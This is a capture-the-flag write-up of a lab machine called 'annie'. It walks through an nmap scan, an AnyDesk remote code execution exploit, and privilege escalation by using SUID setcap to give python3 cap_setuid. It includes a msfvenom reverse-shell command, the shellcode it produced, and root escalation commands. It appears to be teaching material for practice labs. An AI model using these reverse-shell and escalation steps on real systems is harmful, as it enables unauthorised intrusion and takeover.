{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We begin with an nmap scan to identify open ports.")}}

{{console("nmap -T5 -p- 10.10.143.23", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 23:19 CET
Nmap scan report for 10.10.143.23
Host is up (0.14s latency).
Not shown: 64958 closed tcp ports (conn-refused), 574 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
7070/tcp  open  realserver

Nmap done: 1 IP address (1 host up) scanned in 551.85 seconds")}}

{{text("We find 3 open ports. Let\"s scan them further.")}}

{{console("nmap -sC -sV -p 22,7070", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 23:32 CET
Nmap scan report for 10.10.143.23
Host is up (0.15s latency).

PORT      STATE  SERVICE         VERSION
22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp  open   ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after:  2072-03-10T20:04:30
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds")}}

{{header("Shell as annie", "shell-as-annie")}}

{{text("We now see that the service at port 7070 is a <code class=\"bg-gray-300 rounded-md px-1 dark:bg-neutral-700\">AnyDesk Client</code>.")}}

{{text("Unfortunately, we don\"t know the correct version but we still can blindly test known exploits. Let\"s search for one.")}}

{{link("https://www.exploit-db.com/exploits/49613", "https://www.exploit-db.com/favicon.ico", "AnyDesk 5.5.2 - Remote Code Execution")}}

{{text("We copy the exploit, but we need to modify it slightly.")}}

{{text("We change the IP to the correct one and edit the shell code by using the command provided.")}}

{{console("msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.6.6 LPORT=4444 -b \"\\x00\\x25\\x26\" -f python -v shellcode", "...
shellcode =  b\"\"
shellcode += b\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\"
shellcode += b\"\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\x1b\\xb2\\xed\"
shellcode += b\"\\x71\\x59\\xe1\\x69\\x44\\x48\\x31\\x58\\x27\\x48\\x2d\"
shellcode += b\"\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x71\\x9b\\xb5\\xe8\\x33\"
shellcode += b\"\\xe3\\x36\\x2e\\x1a\\xec\\xe2\\x74\\x11\\x76\\x21\\xfd\"
shellcode += b\"\\x19\\xb2\\xfc\\x2d\\x53\\xe8\\x6f\\x42\\x4a\\xfa\\x64\"
shellcode += b\"\\x97\\x33\\xf1\\x33\\x2e\\x31\\xea\\xe2\\x74\\x33\\xe2\"
shellcode += b\"\\x37\\x0c\\xe4\\x7c\\x87\\x50\\x01\\xee\\x6c\\x31\\xed\"
shellcode += b\"\\xd8\\xd6\\x29\\xc0\\xa9\\xd2\\x6b\\x79\\xdb\\x83\\x5e\"
shellcode += b\"\\x2a\\x89\\x69\\x17\\x53\\x3b\\x0a\\x23\\x0e\\xa9\\xe0\"
shellcode += b\"\\xa2\\x14\\xb7\\xed\\x71\\x59\\xe1\\x69\\x44\"")}}

{{text("We replace the shell code with the one we generated, set up a listener and execute the exploit.")}}

{{text("We should get a connection.")}}

{{image("../../static/writeups/annie/images/000001.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("We list all the files with <code class=\"bg-gray-300 rounded-md px-1 dark:bg-neutral-700\">SUID</code> set.")}}

{{console("find / -perm -4000 2>/dev/null", "/sbin/setcap
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
...")}}

{{text("<code class=\"bg-gray-300 rounded-md px-1 dark:bg-neutral-700\">/sbin/setcap</code> looked interesting as I haven\"t seen this file before.")}}

{{text("I found this article that will be helpful to us.")}}

{{link("https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/", "https://www.hackingarticles.in/wp-includes/images/w-logo-blue-white-bg.png", "Linux Privilege Escalation using Capabilities")}}

{{text("Following the article, we have to copy python binary to our home directory and raise our privilages of it using the <code class=\"bg-gray-300 rounded-md px-1 dark:bg-neutral-700\">setcap</code>.")}}

{{console("", "cp /usr/bin/python3 ~
setcap cap_setuid+ep /home/annie/python3
./python3 -c \"import os; os.setuid(0); os.system(\"/bin/bash\")\"
")}}

{{text("After those command, we should become root and be able to read the last flag.")}}

{{image("../../static/writeups/annie/images/000002.jpg")}}

{{script()}}